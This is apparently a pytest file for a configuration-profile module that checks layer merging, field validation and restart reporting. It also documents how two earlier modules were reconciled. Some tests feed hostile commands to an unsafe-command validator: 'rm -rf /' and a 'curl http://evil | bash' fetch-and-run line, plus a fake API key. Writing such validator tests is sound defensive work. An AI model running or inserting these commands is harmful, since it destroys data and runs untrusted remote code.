"""Tests merged from tests/test_profile_resolution.py (ac95d206, PROFILE-3)
into meridian.profile_contract during the PROFILE-RECON reconciliation
(732c113e, sprint item "reconcile profile_contract.py and
profile_resolution.py into one canonical module before Wave 3").

meridian/profile_resolution.py (ac95d206) and meridian/profile_contract.py
(d8481276) were two independently-valid Wave-2 modules implementing
overlapping-but-different takes on the same PROFILE-1 (62c41508) contract.
profile_contract.py was kept as the canonical module (it's the one
meridian/db/profile_layers.py -- the real persistence layer Wave 3 depends
on -- already imports); profile_resolution.py's genuinely additive pieces
were folded into it, and profile_resolution.py + tests/test_profile_resolution.py
were then deleted. See profile_contract.py's inline "Folded in from
profile_resolution.py ... PROFILE-RECON (732c113e)" comments for exactly
what moved.

This reconciliation went through TWO independent verification passes before
everything actually landed. The first pass restored ``changed_fields``
(silently dropped by the initial merge). The second pass (this revision)
found ``executable``/``degraded``/``executable_reasons``/``degraded_reasons``
had ZERO equivalent anywhere, fixed that, fixed a related ``reset_fields``
validation gap found in the same audit, and cross-checked literally every
one of the 51 test functions (57 collected test IDs, once the two
parametrized lifecycle tests are counted per-case) in the deleted
tests/test_profile_resolution.py against this file and
tests/test_profile_layers.py -- see both files' new sections below for what
that audit found and fixed vs. documented as a deliberate divergence.

What moved in (see the corresponding sections below):
  * ProfileFieldSpec.component (tunnel/connector/capability/general) +
    EffectiveProfile.restart_report/restart_required.
  * The unsafe-command regex, wired into validate_layer_fields for
    executor_config.test_cmd/deploy_cmd.
  * Field-value type checking, null-value rejection, and
    capability_manifest_ref structural validation in validate_layer_fields
    (profile_contract.py previously only checked field/layer existence, the
    legacy-authority guard, and secret/path safety).
  * resolve_effective_profile now (a) accepts layers in any order (re-sorts
    to SCOPE_TYPES order) and (b) actually delegates
    list_replace_via_capability_profile merging to
    capability_profile.merge_layers instead of last-write-wins -- closing a
    gap the module's own pre-existing comment already claimed was handled
    "elsewhere" but wasn't.
  * (second pass) EffectiveProfile.executable/executable_reasons/degraded/
    degraded_reasons -- but SPLIT across two functions rather than ported
    verbatim into one: resolve_effective_profile computes the
    blocked_widens-driven half (see the "executable / degraded" section
    below); db.profile_layers.get_effective_profile computes the
    hosted_default-lifecycle half, since resolve_effective_profile is pure
    and, by design, never sees a non-live hosted_default layer (see both
    functions' docstrings and tests/test_profile_layers.py's
    test_get_effective_profile_*_hosted_default_* tests).
  * (second pass) reset_fields entries are now validated against
    FIELD_REGISTRY, both at write time (validate_layer_fields) and at
    resolve time (resolve_effective_profile) -- previously an unknown
    reset_fields name silently no-opped instead of raising.
  * (second pass) ProfileLayer envelope checks: an unsupported
    schema_version, or a lifecycle_state set on a non-hosted_default layer,
    now raise ProfileContractError at resolve time -- previously neither
    was checked anywhere.

What did NOT move in (deliberate, documented divergences -- see the
"documented divergences" section at the bottom of this file for tests that
pin the ACTUAL profile_contract.py behavior at each point, so the gap is
auditable rather than silently lost):
  * Resolve-time re-validation of secrets/paths/unsafe-commands/types/
    capability-contracts. profile_contract.py validates once, at write time
    (validate_layer_fields, called by db.profile_layers.set_profile_layer)
    -- NOT at every resolve_effective_profile call. This is load-bearing:
    db.profile_layers.get_effective_profile builds a SYNTHETIC "project"
    layer containing legacy_source="project_settings" field values that
    validate_layer_fields explicitly REJECTS at scope_type="project" (the
    zero-duplication guard) -- re-running that guard at resolve time would
    break every single effective-profile resolution for every project.
    profile_resolution.py's "validate every layer inside
    resolve_effective_profile" design is incompatible with that synthetic
    layer and was not ported. (The envelope checks added in the second pass
    -- schema_version, lifecycle_state scoping -- are structural, not
    content-safety checks, so they don't run into this problem: the
    synthetic project layer always carries a real, already-valid
    schema_version/no lifecycle_state.)
  * A no-layers resolve returning the FULL FIELD_REGISTRY pre-populated with
    defaults. profile_contract.py returns only fields some layer actually
    set (fields={} for zero layers) -- already relied upon by
    test_profile_layers.py's
    test_get_effective_profile_backward_compatible_with_no_profile_layers_at_all
    (asserts claim_verification_mode is ABSENT, not defaulted, when never set).
  * reset_fields retracting a field back to its registry DEFAULT VALUE.
    profile_contract.py's reset_fields removes the field from ``fields``
    entirely (absent, not defaulted) -- already covered by
    test_profile_layers.py's
    test_resolve_effective_profile_reset_fields_removes_inherited_value.
  * acknowledged_widens as a distinct list + a per-layer
    ProfileLayer.override_reasons dict. profile_contract.py keeps its
    existing call-level ``override_reason`` param to resolve_effective_profile
    plus blocked_widens entries marked ``overridden: True`` -- per the
    PROFILE-RECON reconciliation's explicit instruction to prefer
    profile_contract.py's own naming/mechanism here, since
    db.profile_layers.set_profile_layer already depends on the call-level
    shape.
  * ``layers_applied`` is a plain list of scope_type strings (e.g.
    ``["hosted_default", "project"]``), not a list of
    ``{"scope_type", "scope_id", "revision"}`` dicts. Loses per-layer
    scope_id/revision detail from the report but the load-bearing property
    (which scopes contributed, in order) is unchanged and extensively
    tested (e.g. test_layers_out_of_order_five_deep_still_resolves_to_most_specific).
    Not something either reconciliation pass touched -- profile_contract.py
    had this shape from PROFILE-2 (d8481276), independently of
    profile_resolution.py.
  * claim_verification_mode is writable at scope_type="hosted_default".
    profile_resolution.py's registry deliberately excluded hosted_default
    from this field's allowed_layers ("not something a hosted floor should
    be asserting for every tenant"); profile_contract.py's own registry
    (PROFILE-2, d8481276, predating either reconciliation pass) allows it,
    and HOSTED_DEFAULT_FIXTURE actively exercises this. Pre-existing
    canonical-module design, not something lost during reconciliation --
    see test_divergence_claim_verification_mode_allowed_at_hosted_default.
  * A handful of fields' restart_class classification differs between the
    two registries (each independently assigned per-field judgment calls
    neither module's source item fully specified): hitl_auto_answer and
    require_merge_approval are "hot_reload" here vs.
    "explicit_refresh_required" in profile_resolution.py;
    capability_manifest_ref is "explicit_refresh_required" here vs.
    "restart_required" there. profile_contract.py's own values (assigned at
    PROFILE-2 time) are treated as canonical -- narrow_only/safe_direction
    widen-blocking (the actual safety mechanism for these fields) is
    identical in both registries and unaffected by this classification
    difference.
  * refresh_required is computed ONLY from explicit_refresh_required-class
    field changes here, matching resolve_effective_profile's own docstring
    quote of the PROFILE-1 (62c41508) definition verbatim ("refresh_required
    = generation_key changed AND diff touches an explicit_refresh_required
    field"). profile_resolution.py's independent implementation also set
    refresh_required=True for a restart_required-class-only change
    (test_connector_restart_required_for_shell_type_change asserted both
    restart_required AND refresh_required True) -- profile_contract.py does
    not mirror that extra inclusion. See
    test_divergence_restart_required_field_change_does_not_imply_refresh_required.
"""
from __future__ import annotations

import pytest

from meridian import profile_contract as pc


def _layer(scope_type, fields=None, reset_fields=None, scope_id="x", revision=1):
    return pc.ProfileLayer(
        scope_type=scope_type, scope_id=scope_id, revision=revision,
        fields=fields or {}, reset_fields=reset_fields or [],
    )


def _cap(id_, required_tools=("Serena",), availability_policy="required"):
    return {"id": id_, "purpose": "x", "required_tools": list(required_tools),
            "availability_policy": availability_policy}


# ---------------------------------------------------------------------------
# Layer ordering robustness (folded in from profile_resolution.py)
# ---------------------------------------------------------------------------

def test_layers_may_be_passed_out_of_order():
    result = pc.resolve_effective_profile([
        _layer("project", {"auto_worktrees": 0}, scope_id="p1"),
        _layer("hosted_default", {"auto_worktrees": 1}, scope_id="hd"),
    ])
    assert result.fields["auto_worktrees"] == 0
    assert result.field_sources["auto_worktrees"] == "project"


def test_layers_out_of_order_five_deep_still_resolves_to_most_specific():
    layers = [
        _layer("session", {"max_pinned_decisions": 70}, scope_id="s1"),
        _layer("hosted_default", {"max_pinned_decisions": 30}, scope_id="hd"),
        _layer("project", {"max_pinned_decisions": 60}, scope_id="p1"),
        _layer("user", {"max_pinned_decisions": 50}, scope_id="u1"),
        _layer("workspace", {"max_pinned_decisions": 40}, scope_id="ws1"),
    ]
    result = pc.resolve_effective_profile(layers)
    assert result.fields["max_pinned_decisions"] == 70
    assert result.field_sources["max_pinned_decisions"] == "session"
    assert result.layers_applied == ["hosted_default", "workspace", "user", "project", "session"]


# ---------------------------------------------------------------------------
# capability_manifest_ref: real merge delegation (folded in; previously
# wholesale last-write-wins despite the module's own comment claiming
# delegation happened "elsewhere")
# ---------------------------------------------------------------------------

def test_capability_manifest_ref_merges_across_layers_not_last_write_wins():
    result = pc.resolve_effective_profile([
        _layer("workspace", {"capability_manifest_ref": [_cap("serena")]}, scope_id="ws1"),
        _layer("project", {"capability_manifest_ref": [_cap("code_intel")]}, scope_id="p1"),
    ])
    ids = sorted(c["id"] for c in result.fields["capability_manifest_ref"])
    assert ids == ["code_intel", "serena"]


def test_capability_manifest_ref_conflict_detected_via_capability_profile():
    result = pc.resolve_effective_profile([
        _layer("workspace", {"capability_manifest_ref": [_cap("serena", availability_policy="required")]}, scope_id="ws1"),
        _layer("project", {"capability_manifest_ref": [_cap("serena", availability_policy="optional")]}, scope_id="p1"),
    ])
    ref_overrides = [o for o in result.overrides if o["field"] == "capability_manifest_ref"]
    assert ref_overrides and ref_overrides[-1]["conflict"] is True


def test_capability_manifest_ref_same_declaration_across_layers_is_not_a_conflict():
    result = pc.resolve_effective_profile([
        _layer("workspace", {"capability_manifest_ref": [_cap("serena")]}, scope_id="ws1"),
        _layer("project", {"capability_manifest_ref": [_cap("serena")]}, scope_id="p1"),
    ])
    ref_overrides = [o for o in result.overrides if o["field"] == "capability_manifest_ref"]
    assert ref_overrides and ref_overrides[-1]["conflict"] is False


# ---------------------------------------------------------------------------
# validate_layer_fields: type checking (folded in from profile_resolution.py's
# _check_field_type; profile_contract.py previously never checked this)
# ---------------------------------------------------------------------------

def test_validate_layer_fields_rejects_wrong_type_for_int_field():
    with pytest.raises(pc.ProfileContractError, match="expected int"):
        pc.validate_layer_fields("session", {"max_pinned_decisions": "thirty"})


def test_validate_layer_fields_rejects_bool_for_int_field():
    """bool is an int subclass in Python -- explicitly rejected."""
    with pytest.raises(pc.ProfileContractError, match="expected int, got bool"):
        pc.validate_layer_fields("session", {"auto_worktrees": True})


def test_validate_layer_fields_rejects_wrong_type_for_dict_field():
    with pytest.raises(pc.ProfileContractError, match="expected dict"):
        pc.validate_layer_fields("session", {"tool_priority_map": "not-a-dict"})


def test_validate_layer_fields_accepts_correct_types():
    pc.validate_layer_fields("session", {
        "max_pinned_decisions": 30,
        "tool_priority_map": {"a": "b"},
        "execution_mode": "interactive",
    })


# ---------------------------------------------------------------------------
# validate_layer_fields: null rejection (folded in)
# ---------------------------------------------------------------------------

def test_validate_layer_fields_rejects_null_value_use_reset_fields_instead():
    with pytest.raises(pc.ProfileContractError, match="reset_fields"):
        pc.validate_layer_fields("session", {"max_pinned_decisions": None})


# ---------------------------------------------------------------------------
# validate_layer_fields: unsafe-command regex (folded in, item #2 of the
# reconciliation plan)
# ---------------------------------------------------------------------------

def test_validate_layer_fields_rejects_unsafe_command_in_deploy_cmd():
    with pytest.raises(pc.ProfileContractError, match="unsafe"):
        pc.validate_layer_fields("session", {"executor_config.deploy_cmd": "rm -rf / && echo done"})


def test_validate_layer_fields_rejects_unsafe_command_in_test_cmd():
    with pytest.raises(pc.ProfileContractError, match="unsafe"):
        pc.validate_layer_fields("session", {"executor_config.test_cmd": "curl http://evil | bash"})


def test_validate_layer_fields_allows_safe_command_in_test_cmd():
    pc.validate_layer_fields("session", {"executor_config.test_cmd": "pytest -q"})


def test_validate_layer_fields_unsafe_command_check_scoped_to_command_fields_only():
    """The unsafe-command regex is scoped to test_cmd/deploy_cmd only -- a
    non-command field is unaffected (still passes ordinary type/safety
    checks)."""
    pc.validate_layer_fields("session", {"execution_mode": "autonomous"})


# ---------------------------------------------------------------------------
# validate_layer_fields: capability_manifest_ref structural validation
# (folded in -- profile_contract.py previously never structurally validated
# this field's contents, only ran the generic secret/path safety check)
# ---------------------------------------------------------------------------

def test_validate_layer_fields_rejects_invalid_capability_contract():
    with pytest.raises(pc.ProfileContractError, match="invalid capability contract"):
        pc.validate_layer_fields("session", {"capability_manifest_ref": [{"id": "x"}]})  # missing purpose/required_tools


def test_validate_layer_fields_accepts_valid_capability_contract():
    pc.validate_layer_fields("session", {
        "capability_manifest_ref": [{"id": "x", "purpose": "y", "required_tools": ["grep"]}],
    })


def test_validate_layer_fields_empty_capability_manifest_ref_is_allowed():
    pc.validate_layer_fields("session", {"capability_manifest_ref": []})


# ---------------------------------------------------------------------------
# component classification + restart_report (folded in, item #1 of the
# reconciliation plan)
# ---------------------------------------------------------------------------

def test_field_registry_every_field_has_a_component():
    for name, spec in pc.FIELD_REGISTRY.items():
        assert spec.component in ("tunnel", "connector", "capability", "general"), name


def test_tunnel_component_is_always_none_in_current_registry():
    """No field is currently classified component='tunnel' -- reserved for
    when tunnel.py's has_active_tunnel()-gated fields land."""
    assert not any(spec.component == "tunnel" for spec in pc.FIELD_REGISTRY.values())
    result = pc.resolve_effective_profile(
        [_layer("project", {"capability_manifest_ref": [_cap("x")]}, scope_id="p1")],
        previous_fields={},
    )
    assert result.restart_report["tunnel"] == "none"


def test_restart_report_connector_restart_required_for_repo_path_change():
    result = pc.resolve_effective_profile(
        [_layer("project", {"executor_config.repo_path": "C:/repo"}, scope_id="p1")],
        previous_fields={},
    )
    assert result.restart_report["connector"] == "restart_required"
    assert result.restart_report["tunnel"] == "none"
    assert result.restart_report["capability"] == "none"
    assert result.restart_required is True


def test_restart_report_capability_bucket_for_tool_priority_map_change():
    result = pc.resolve_effective_profile(
        [_layer("project", {"tool_priority_map": {"a": "b"}}, scope_id="p1")],
        previous_fields={},
    )
    assert result.restart_report["capability"] == "hot_reload"
    assert result.restart_required is False


def test_restart_report_general_bucket_for_max_pinned_decisions_change():
    result = pc.resolve_effective_profile(
        [_layer("project", {"max_pinned_decisions": 30}, scope_id="p1")],
        previous_fields={},
    )
    assert result.restart_report["general"] == "hot_reload"
    assert all(v == "none" for k, v in result.restart_report.items() if k != "general")


def test_restart_report_all_none_without_previous_fields():
    """restart_report (like refresh_required) needs a previous_fields
    baseline to diff against -- omitted, every component reports 'none'."""
    result = pc.resolve_effective_profile(
        [_layer("project", {"executor_config.repo_path": "C:/repo"}, scope_id="p1")],
    )
    assert all(v == "none" for v in result.restart_report.values())
    assert result.restart_required is False


def test_restart_report_all_none_when_nothing_changed():
    layers = [_layer("project", {"auto_worktrees": 0}, scope_id="p1")]
    first = pc.resolve_effective_profile(layers)
    second = pc.resolve_effective_profile(layers, previous_fields=first.fields)
    assert all(v == "none" for v in second.restart_report.values())
    assert second.restart_required is False
    assert second.refresh_required is False


# ---------------------------------------------------------------------------
# changed_fields (folded in from profile_resolution.py's
# EffectiveProfile.changed_fields, ac95d206 -- this was the one piece the
# initial PROFILE-RECON reconciliation (732c113e) silently dropped; ported
# here on re-verification from the deleted tests/test_profile_resolution.py's
# test_changed_fields_against_defaults_when_no_previous_given,
# test_changed_fields_against_explicit_previous, and (partially --
# the restart/refresh half is already covered by
# test_restart_report_all_none_when_nothing_changed above)
# test_no_change_yields_no_restart_or_refresh_required. Adapted for
# profile_contract.py's own sparse-``fields``/``previous_fields`` shape --
# see the "documented divergences" section below: profile_resolution.py
# pre-seeded `effective`/a full `previous_effective_fields` baseline with
# every FIELD_REGISTRY default; profile_contract.py's `effective` and its
# callers' `previous_fields` only ever carry fields some layer actually set.
# ---------------------------------------------------------------------------

def test_changed_fields_against_defaults_when_no_previous_given():
    result = pc.resolve_effective_profile([
        _layer("project", {"auto_worktrees": 0}, scope_id="p1"),
    ])
    assert result.changed_fields == {
        "auto_worktrees": {"old": pc.FIELD_REGISTRY["auto_worktrees"].default, "new": 0},
    }


def test_changed_fields_against_explicit_previous():
    layers = [_layer("project", {"auto_worktrees": 0, "code_intel_enabled": 1}, scope_id="p1")]
    # A sparse previous baseline (profile_contract.py's own `fields` shape --
    # only fields some prior layer actually set, not every registry
    # default) with auto_worktrees already at 0 -- only code_intel_enabled
    # should show up as changed. code_intel_enabled is absent from
    # `previous`, so its reported "old" is None (piggybacking verbatim on
    # the same previous_fields.get()/effective.get() calls already used for
    # refresh_required/restart_report -- not re-derived from the registry).
    previous = {"auto_worktrees": 0}
    result = pc.resolve_effective_profile(layers, previous_fields=previous)
    assert result.changed_fields == {"code_intel_enabled": {"old": None, "new": 1}}


def test_no_change_yields_empty_changed_fields():
    layers = [_layer("project", {"auto_worktrees": 0}, scope_id="p1")]
    first = pc.resolve_effective_profile(layers)
    second = pc.resolve_effective_profile(layers, previous_fields=first.fields)
    assert second.changed_fields == {}
    # Restart/refresh half of the original (deleted) test -- also covered by
    # test_restart_report_all_none_when_nothing_changed above.
    assert second.restart_required is False
    assert second.refresh_required is False
    assert all(v == "none" for v in second.restart_report.values())


# ---------------------------------------------------------------------------
# executable / degraded (folded in from profile_resolution.py's
# EffectiveProfile.executable/degraded during the second PROFILE-RECON
# re-verification pass, 732c113e -- this is the pure/blocked_widens-driven
# half of the signal; the hosted_default-lifecycle half is computed by
# db.profile_layers.get_effective_profile and covered by
# tests/test_profile_layers.py's test_get_effective_profile_*_hosted_default_*
# tests instead, since resolve_effective_profile never sees a non-live
# hosted_default layer -- see resolve_effective_profile's own docstring.)
# ---------------------------------------------------------------------------

def test_no_layers_is_executable_and_not_degraded():
    result = pc.resolve_effective_profile([])
    assert result.executable is True
    assert result.executable_reasons == []
    assert result.degraded is False
    assert result.degraded_reasons == []


def test_ordinary_resolution_without_blocked_widens_is_not_degraded():
    result = pc.resolve_effective_profile([_layer("project", {"auto_worktrees": 0}, scope_id="p1")])
    assert result.executable is True
    assert result.degraded is False


def test_blocked_widen_marks_degraded_but_still_executable():
    result = pc.resolve_effective_profile([
        _layer("hosted_default", {"hitl_auto_answer": 0}, scope_id="global"),
        _layer("session", {"hitl_auto_answer": 2}, scope_id="s1"),
    ])
    assert result.executable is True
    assert result.degraded is True
    assert result.degraded_reasons == ["narrow_only_widen_blocked"]


def test_overridden_widen_still_marks_degraded():
    """override_reason lets the widen through, but blocked_widens (with
    overridden=True) still gets recorded -- degraded still reflects that a
    narrow_only field needed an override, same as an unoverridden block."""
    result = pc.resolve_effective_profile(
        [
            _layer("hosted_default", {"hitl_auto_answer": 0}, scope_id="global"),
            _layer("session", {"hitl_auto_answer": 2}, scope_id="s1"),
        ],
        override_reason="incident response",
    )
    assert result.fields["hitl_auto_answer"] == 2
    assert result.degraded is True
    assert result.degraded_reasons == ["narrow_only_widen_blocked"]


# ---------------------------------------------------------------------------
# reset_fields validated against FIELD_REGISTRY (folded in from
# profile_resolution.py's validate_profile_layer during the second
# PROFILE-RECON re-verification pass, 732c113e -- previously an unknown
# reset_fields name silently no-opped instead of raising, at both the
# write-time (validate_layer_fields) and resolve-time (resolve_effective_
# profile) checkpoints. DB-level ported tests live in
# tests/test_profile_layers.py alongside the rest of the reset_fields
# coverage.)
# ---------------------------------------------------------------------------

def test_validate_layer_fields_accepts_known_reset_field():
    pc.validate_layer_fields("project", {}, reset_fields=["auto_worktrees"])


# ---------------------------------------------------------------------------
# schema_version / lifecycle_state envelope checks (folded in from
# profile_resolution.py's validate_profile_layer during the second
# PROFILE-RECON re-verification pass, 732c113e.)
# ---------------------------------------------------------------------------

def test_resolve_effective_profile_accepts_matching_schema_version():
    pc.resolve_effective_profile([
        _layer("project", {"auto_worktrees": 0}, scope_id="p1"),  # default schema_version == SCHEMA_VERSION
    ])  # must not raise


# ---------------------------------------------------------------------------
# Documented divergences from profile_resolution.py -- these pin
# profile_contract.py's ACTUAL (deliberately different) behavior so a future
# reader can see exactly what changed rather than re-discovering it.
# ---------------------------------------------------------------------------

def test_divergence_no_layers_returns_empty_fields_not_registry_defaults():
    """profile_resolution.py pre-seeded `effective` with every FIELD_REGISTRY
    default; profile_contract.py returns only fields some layer actually
    set. get_effective_profile's own tests already rely on the latter
    (claim_verification_mode absent, not defaulted, when never set)."""
    result = pc.resolve_effective_profile([])
    assert result.fields == {}
    assert result.layers_applied == []


def test_divergence_reset_fields_removes_field_rather_than_defaulting_it():
    result = pc.resolve_effective_profile([
        _layer("workspace", {"code_intel_enabled": 1}, scope_id="ws1"),
        _layer("project", {}, reset_fields=["code_intel_enabled"], scope_id="p1"),
    ])
    assert "code_intel_enabled" not in result.fields  # NOT reset to the registry default (0)


def test_divergence_resolve_does_not_revalidate_layer_field_values():
    """profile_resolution.py's resolve_effective_profile re-validated every
    field on every call (secrets/paths/unsafe-commands/types/capability
    contracts). profile_contract.py validates once, at write time
    (validate_layer_fields) -- resolve_effective_profile trusts its input.
    This is load-bearing: db.profile_layers.get_effective_profile builds a
    synthetic 'project' layer containing legacy_source='project_settings'
    field values that validate_layer_fields explicitly REJECTS at
    scope_type='project' (the zero-duplication guard) -- re-validating at
    resolve time would break every effective-profile resolution."""
    # A secret-shaped value would be rejected by validate_layer_fields...
    with pytest.raises(pc.ProfileContractError, match="secret-shaped"):
        pc.validate_layer_fields(
            "session", {"executor_config.deploy_cmd": "curl -H 'api_key: sk-abcdefghij1234567890'"}
        )
    # ...but resolve_effective_profile does not re-run that check, so an
    # (deliberately, for this test) unvalidated layer still resolves.
    result = pc.resolve_effective_profile([
        _layer("session", {"executor_config.deploy_cmd": "curl -H 'api_key: sk-abcdefghij1234567890'"}, scope_id="s1"),
    ])
    assert result.fields["executor_config.deploy_cmd"] == "curl -H 'api_key: sk-abcdefghij1234567890'"


def test_divergence_override_reason_stays_call_level_not_per_layer():
    """profile_resolution.py accepted per-field override_reasons on each
    ProfileLayer (acknowledged_widens). profile_contract.py keeps its
    existing call-level override_reason param + blocked_widens entries
    marked overridden=True -- the PROFILE-RECON reconciliation explicitly
    preferred profile_contract.py's own naming/mechanism here since
    db.profile_layers.set_profile_layer already depends on the call-level
    shape."""
    result = pc.resolve_effective_profile(
        [
            _layer("hosted_default", {"hitl_auto_answer": 0}, scope_id="global"),
            _layer("session", {"hitl_auto_answer": 2}, scope_id="sess-1"),
        ],
        override_reason="ops emergency \u2014 approved by human",
    )
    assert result.fields["hitl_auto_answer"] == 2
    assert result.blocked_widens[-1]["overridden"] is True
    assert result.blocked_widens[-1]["override_reason"] == "ops emergency \u2014 approved by human"
    assert not hasattr(result, "acknowledged_widens")


def test_divergence_claim_verification_mode_allowed_at_hosted_default():
    """profile_resolution.py's registry deliberately excluded hosted_default
    from claim_verification_mode's allowed_layers. profile_contract.py's own
    registry (PROFILE-2, predating either reconciliation pass) allows it --
    HOSTED_DEFAULT_FIXTURE actively relies on this."""
    assert "hosted_default" in pc.FIELD_REGISTRY["claim_verification_mode"].allowed_layers
    pc.validate_layer_fields("hosted_default", {"claim_verification_mode": "strict"})  # must not raise
    result = pc.resolve_effective_profile([_layer("hosted_default", {"claim_verification_mode": "strict"}, scope_id="global")])
    assert result.fields["claim_verification_mode"] == "strict"


def test_divergence_restart_class_differs_for_some_fields_between_registries():
    """profile_resolution.py classified hitl_auto_answer/require_merge_approval
    as explicit_refresh_required and capability_manifest_ref as
    restart_required; profile_contract.py's own registry (predating either
    reconciliation pass) classifies them hot_reload/hot_reload/
    explicit_refresh_required respectively. The safety-relevant mechanism
    (narrow_only/safe_direction widen-blocking) is identical in both
    registries -- only the restart/refresh bucketing differs."""
    assert pc.FIELD_REGISTRY["hitl_auto_answer"].restart_class == "hot_reload"
    assert pc.FIELD_REGISTRY["require_merge_approval"].restart_class == "hot_reload"
    assert pc.FIELD_REGISTRY["capability_manifest_ref"].restart_class == "explicit_refresh_required"


def test_divergence_restart_required_field_change_does_not_imply_refresh_required():
    """profile_resolution.py's refresh_required was True for EITHER an
    explicit_refresh_required OR a restart_required field change.
    profile_contract.py's resolve_effective_profile docstring quotes
    PROFILE-1's own definition verbatim ("refresh_required = ... diff
    touches an explicit_refresh_required field") -- a restart_required-only
    change does not set it."""
    result = pc.resolve_effective_profile(
        [_layer("project", {"executor_config.repo_path": "C:/repo"}, scope_id="p1")],
        previous_fields={},
    )
    assert result.restart_report["connector"] == "restart_required"
    assert result.restart_required is True
    assert result.refresh_required is False
